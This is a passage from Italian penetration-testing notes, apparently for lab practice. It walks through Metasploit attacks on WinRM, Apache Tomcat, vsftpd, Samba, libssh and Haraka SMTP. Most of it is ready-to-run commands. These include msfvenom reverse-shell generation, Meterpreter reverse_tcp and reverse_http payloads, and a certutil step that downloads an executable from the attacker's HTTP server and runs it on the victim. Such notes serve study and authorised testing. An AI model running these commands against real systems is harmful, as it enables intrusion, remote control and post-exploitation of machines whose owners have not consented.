> Nota: Impostare `PASSWORD anything` è un workaround necessario: MSF userà comunque il file `PASS_FILE`, ma il modulo richiede che la variabile non sia vuota per partire.

#### 🚀 Esecuzione Comandi e Meterpreter

Una volta ottenute le credenziali, possiamo eseguire comandi o ottenere una sessione avanzata.

Test Esecuzione Comandi:

```
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD <password_trovata>
set CMD whoami
run
```

#### Ottenere Sessione Meterpreter

Per passare da una semplice shell a Meterpreter (Post-Exploitation):

```
use exploit/windows/winrm/winrm_script_exec
set USERNAME administrator
set PASSWORD <password_trovata>
set FORCE_VBS true # Fix per errori con PowerShell CommandStager
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <Tuo_IP>
exploit
```

{% hint style="info" %}
Troubleshooting: Se il modulo `winrm_script_exec` fallisce, è spesso dovuto al sistema di "Command Staging". Impostare `FORCE_VBS` a `true` forza l'uso di Visual Basic Script, aggirando eventuali restrizioni di esecuzione di PowerShell sul target.
{% endhint %}

### 🐱 Exploiting Apache Tomcat & Meterpreter Upgrade

L'obiettivo è sfruttare una vulnerabilità di Remote Code Execution (RCE) su Apache Tomcat (v8.5.19) e aggiornare la shell limitata iniziale a una sessione Meterpreter completa.

#### 🔍 1. Enumerazione e Accesso Iniziale

Identifichiamo il servizio e otteniamo una shell di comando (CMD).

```
# Enumerazione
db_nmap -sV -p 8080 10.2.20.126
services

# Exploitation (JSP Upload Bypass)
search tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
set SHELL cmd
run
```

_Nota: Questa fase fornisce una shell Java limitata che non supporta i moduli di post-exploitation avanzati._

#### 🛠️ 2. Preparazione dell'Upgrade (Msfvenom & Automation)

Generiamo il payload Windows e automatizziamo il listener per risparmiare tempo.

#### Generazione Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > shell.exe
```

#### Automazione Handler (handler.rc)

Crea uno script per avviare il listener all'istante:

```
echo "use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run" > handler.rc

# Avvio rapido
msfconsole -r handler.rc
```

#### 🚚 3. Trasferimento con Certutil ed Esecuzione

Dalla shell CMD ottenuta nel punto 1, scarichiamo ed eseguiamo il payload Meterpreter.

#### Hosting e Download

```
# Sulla Kali (nella cartella del file shell.exe):
python3 -m http.server 80

# Sulla Vittima (shell CMD):
certutil -urlcache -f http://10.10.10.5/shell.exe shell.exe
```

#### Esecuzione e Stabilizzazione

```
# Sulla Vittima (shell CMD):
shell.exe

# Su Metasploit (una volta aperta la sessione):
getuid
run post/windows/manage/migrate # Migrazione automatica per stabilità
```

### 📊 Tabella Strumenti e Variabili

| **Strumento / Variabile** | **Funzione**                                              |
| ------------------------- | --------------------------------------------------------- |
| `certutil`                | Download file tramite URL su Windows (nativo).            |
| `.rc script`              | Automazione comandi MSF all'avvio.                        |
| `LHOST / LPORT`           | IP e Porta dell'attaccante per la connessione di ritorno. |
| `jsp_upload_bypass`       | Exploit per caricare file JSP dove non permesso.          |

> Perché questo giro? Molti exploit (come questo di Tomcat) caricano shell Java che sono "instabili" per la post-exploitation. L'uso di certutil per caricare un eseguibile nativo Windows (.exe) è la tecnica standard per ottenere una Meterpreter stabile e potente.

## Linux Exploitation

### Creazione workspace MSF ed enumeration del target

```
service postgresql start
msfconsole
workspace -a nomeworkspace
setg RHOSTS 192.86.51.3
db_nmap -sS -sV -O 192.209.183.3
```

### Upgrade da command shell a meterpreter

```
CTRL+Z //per mettere in background la sessione command shell aperta precedentemente
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST eth1
set SESSION 1
run
sessions
sessions 2
sysinfo
getuid
```

### Exploiting A Vulnerable FTP Server

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
info
run
ls
/bin/bash -i
```

### Exploiting Samba

<pre><code>search type:exploit name:samba
<strong>use exploit/linux/samba/is_known_pipename
</strong>show options
check //controlliamo se il target è vulnerabile e se c'è una share writable
info //per controllare che l'exploit sia compatible con la versione di samba del target
run
ls
pwd
</code></pre>

### Exploiting a Vulnerable SSH Server

```
search libssh_auth_bypass
use auxiliary/scanner/ssh/libssh_auth_bypass
show options
set SPAWN_PTY true
run
sessions
sessions 1
whoami
cat /etc/*release //per capire la versione di linux
uname -r  //per verificare versione del kernel
```

### Exploiting A Vulnerable SMTP Server (Haraka)

```
search type:exploit name:haraka
use exploit/linux/smtp/haraka
show options
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http //è un unstaged payload
set LHOST eth1
run
sysinfo
getuid
```

